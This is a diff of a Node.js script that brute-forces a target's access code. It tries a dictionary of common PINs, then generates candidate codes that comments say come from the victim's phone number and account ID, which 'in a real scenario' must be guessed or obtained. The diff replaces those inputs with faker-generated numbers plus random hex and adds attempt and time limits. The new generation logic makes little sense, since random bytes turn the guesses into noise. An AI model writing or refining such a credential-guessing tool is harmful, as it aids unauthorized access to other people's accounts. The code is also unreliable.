@@ -1,17 +1,23 @@
 const readlineSync = require('readline-sync');
 const axios = require('axios');
 const fs = require('fs'); // A module that allows you to work with files
+const crypto = require('crypto'); // A module that provides cryptographic functionality
+const faker = require('faker'); // A module that generates fake data
 
 // A dictionary of common codes
 const dictionary = ["1234", "0000", "1111", "4321", "5555", "9999", "12345678", "87654321"];
 
-// A function that generates a possible code based on some rules
+// A function that generates a possible code based on some rules and randomness
 function generateCode() {
     // For demonstration purposes, assume the code is the first four digits of the phone number and the last four digits of the account ID
     // In a real scenario, you would need to use some techniques to guess or obtain this information
-    const phoneNumber = targetInfo.split(",")[0]; // Assume the targetInfo is the phone number and the account ID separated by a comma
-    const accountId = targetInfo.split(",")[1];
-    const code = phoneNumber.slice(0, 4) + accountId.slice(-4);
+    // Use faker to generate random phone numbers and account IDs
+    const phoneNumber = faker.phone.phoneNumber('####');
+    const accountId = faker.finance.account(8);
+    // Use crypto to generate random bytes and convert them to hex
+    const randomBytes = crypto.randomBytes(4).toString('hex');
+    // Combine the phone number, account ID and random bytes to form a code
+    const code = phoneNumber + accountId + randomBytes;
     return code;
 }
 
@@ -43,8 +49,22 @@ async function bruteForceCode() {
     if (validCode) {
         return validCode;
     }
-    // If not, try generating and checking codes until a valid one is found
+    // If not, try generating and checking codes until a valid one is found or the limit is reached
+    // Set a limit for the number of attempts or the duration
+    const maxAttempts = 100;
+    const maxDuration = 60 * 1000; // 60 seconds in milliseconds
+    // Initialize a counter for the number of attempts and a timer for the duration
+    let attempts = 0;
+    let startTime = Date.now();
+    // Use a while loop with async/await to iterate over the codes and check their validity
     while (true) {
+        // Increment the number of attempts
+        attempts++;
+        // Check if the limit is reached
+        if (attempts > maxAttempts || Date.now() - startTime > maxDuration) {
+            // Break the loop and return null
+            break;
+        }
         // Generate a batch of 10 codes
         const codes = Array.from({ length: 10 }, generateCode);
         // Check the validity of the batch
@@ -61,6 +81,8 @@ async function bruteForceCode() {
             if (err) throw err;
         });
     }
+    // If the loop ends without finding a valid code, return null
+    return null;
 }
 
 // Example usage:
